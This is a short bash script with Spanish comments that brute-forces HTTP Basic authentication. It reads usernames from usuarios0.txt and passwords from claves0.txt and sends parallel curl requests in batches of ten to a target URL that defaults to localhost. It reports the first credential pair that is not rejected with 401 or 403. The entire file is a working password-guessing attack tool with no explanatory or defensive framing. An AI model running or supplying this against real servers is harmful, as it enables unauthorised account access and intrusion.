#!/bin/bash
# Uso: ./brutehttp7.sh [URL]
URL=${1:-http://localhost/}
MAX_THREADS=10
THREAD_COUNT=0
test_auth() {
    local user=$1
    local pass=$2
    local auth=$(printf "%s:%s" "$user" "$pass" | base64)   
    response=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Basic $auth" "$URL" 2>/dev/null)
    
    if [ "$response" -ne 401 ] && [ "$response" -ne 403 ]; then
        echo -e "\n[+] Credenciales: $user:$pass (Código: $response)"
        kill $(jobs -p) 2>/dev/null
        exit 0
    fi
}
while read password; do
    while read user; do
        ((THREAD_COUNT++))
        test_auth "$user" "$password" &
        if [ $((THREAD_COUNT % MAX_THREADS)) -eq 0 ]; then
            wait
        fi
    done < <(tr -d '\r' < usuarios0.txt)
done < <(tr -d '\r' < claves0.txt)
wait
echo -e "\n[!] ..."
